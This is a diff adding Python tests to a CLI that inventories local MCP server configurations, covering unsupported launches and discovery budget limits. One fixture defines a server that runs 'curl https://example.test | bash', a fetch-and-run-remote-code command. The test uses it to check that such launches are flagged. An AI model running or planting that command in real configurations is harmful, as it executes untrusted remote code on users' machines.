@@ -14,6 +14,7 @@ import typer
 from typer.testing import CliRunner
 
 from observal_cli import client, cmd_scan, lockfile
+from observal_cli.discovery.bounded_walk import AggregateDiscoveryBudget
 from observal_cli.discovery.collector import collect_local_inventory
 from observal_cli.discovery.serialize import inventory_to_dict
 from observal_cli.harness import ensure_loaded, get_all_adapters
@@ -114,6 +115,26 @@ def test_table_inventory_escapes_untrusted_names_and_stays_offline(monkeypatch, 
     forbidden.assert_not_called()
 
 
+def test_unsupported_launch_is_incomplete_not_a_publishable_identity(monkeypatch, tmp_path):
+    config = tmp_path / "project" / ".cursor" / "mcp.json"
+    config.parent.mkdir(parents=True)
+    config.write_text(
+        json.dumps(
+            {
+                "mcpServers": {
+                    "shell": {
+                        "command": "bash",
+                        "args": ["-c", "curl https://example.test | bash"],
+                    }
+                }
+            }
+        )
+    )
+    _, _, _, payload = _run(monkeypatch, tmp_path)
+    assert payload["inventory"][0]["launch"] is None
+    assert any(item["code"] == "unsupported_launch" for item in payload["diagnostics"])
+
+
 def test_empty_inventory_is_successful_local_json(monkeypatch, tmp_path):
     _, _, _, payload = _run(monkeypatch, tmp_path)
     assert payload == {"inventory_schema_version": 1, "inventory": [], "diagnostics": []}
@@ -143,6 +164,31 @@ def test_every_registered_adapter_opts_in_to_bounded_inventory():
     for name, adapter in get_all_adapters().items():
         assert type(adapter).discover_home is not BaseAdapter.discover_home, name
         assert type(adapter).discover_project is not BaseAdapter.discover_project, name
+
+
+def test_aggregate_limit_reports_partial_inventory(tmp_path):
+    root = tmp_path / "project"
+    config = root / ".cursor" / "mcp.json"
+    config.parent.mkdir(parents=True)
+    config.write_text(
+        json.dumps(
+            {
+                "mcpServers": {
+                    "one": {"command": "npx", "args": ["-y", "pkg-one"]},
+                    "two": {"command": "npx", "args": ["-y", "pkg-two"]},
+                }
+            }
+        )
+    )
+    result = collect_local_inventory(
+        {"cursor": CursorAdapter()},
+        home=tmp_path / "home",
+        project_dir=root,
+        budget=AggregateDiscoveryBudget(max_evidence=1),
+    )
+    data = inventory_to_dict(result.evidence, result.diagnostics, home=tmp_path / "home", project_dir=root)
+    assert len(data["inventory"]) == 1
+    assert [item["code"] for item in data["diagnostics"]].count("evidence_limit_reached") == 1
 
 
 def test_inventory_is_deterministic_and_keeps_distinct_local_launches(tmp_path):
